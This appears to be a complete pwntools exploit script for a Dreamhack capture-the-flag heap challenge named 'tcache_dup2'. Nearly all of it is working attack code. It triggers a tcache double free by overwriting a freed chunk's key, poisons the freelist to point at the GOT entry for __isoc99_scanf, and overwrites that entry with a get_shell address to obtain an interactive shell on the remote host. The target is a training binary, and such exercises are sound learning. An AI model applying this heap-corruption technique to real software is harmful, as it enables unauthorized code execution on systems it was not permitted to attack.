#!/usr/bin/python3

from pwn import *

#p = process("./tcache_dup2")
p = remote("host1.dreamhack.games", 11956)
e = ELF("./tcache_dup2")

sla = lambda t, s: p.sendlineafter(t, s)
sa = lambda t, s: p.sendafter(t, s)

def create(size, data):
    sla("> ", str(1))
    sla(": ", str(size))
    sa(": ", data)

def modify(idx, size, data):
    sla("> ", str(2))
    sla(": ", str(idx))
    sla(": ", str(size))
    sa(": ", data)

def delete(idx):
    sla("> ", str(3))
    sla(": ", str(idx))

# dummy
create(0x30, "HI")
create(0x30, "BYE")

# Make DFB
create(0x30, "choisian")
delete(0)
delete(1)
delete(2)
modify(2, 0x9, "choisian\x00")
delete(2)

# Manipulate tcache freelist
create(0x30, p64(e.got['__isoc99_scanf']))
#create(0x30, p64(e.got['printf']))
create(0x30, "choisian")

# tcache dup
create(0x30, p64(e.sym['get_shell']))

p.interactive()
